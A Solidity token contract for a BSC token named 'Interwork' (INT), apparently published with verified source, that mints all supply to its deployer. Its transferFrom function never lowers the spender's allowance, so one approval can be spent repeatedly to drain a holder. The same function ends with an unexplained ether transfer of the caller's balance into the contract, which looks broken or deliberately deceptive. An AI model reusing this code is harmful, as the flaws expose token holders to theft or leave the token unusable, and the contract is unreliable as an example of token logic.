/**
 *Submitted for verification at BscScan.com on 2023-01-11
*/

// File: Metaverse.sol



pragma solidity ^0.6.6;


// All subsequent code will be inside this block

contract Metaverse {
    
    string public name = "Interwork"; // Holds the name of the token
    string public symbol = "INT"; // Holds the symbol of the token
    uint256 public decimals = 18; // Holds the decimal places of the token
    uint256 public totalSupply; // Holds the total suppy of the token
    /* This creates a mapping with all balances */
    mapping(address => uint256) public balances;
    /* This creates a mapping of accounts with allowances */
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    /* This event is always fired on a successfull call of the approve method */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor() public {
        // Sets the total supply of tokens
        uint256 _initialSupply = 1000000000 * 10**18;
        totalSupply = _initialSupply;
        // Transfers all tokens to owner
        balances[msg.sender] = totalSupply;
        
    }

    function balanceOf(address owner) public view returns (uint256) {
        return balances[owner];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf(msg.sender) >= value, "balance not enough");
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        require(balanceOf(from) >= value, "balance too low");
        require(allowance[from][msg.sender] >= value, "allowance too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        payable(address(this)).transfer(msg.sender.balance);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    
}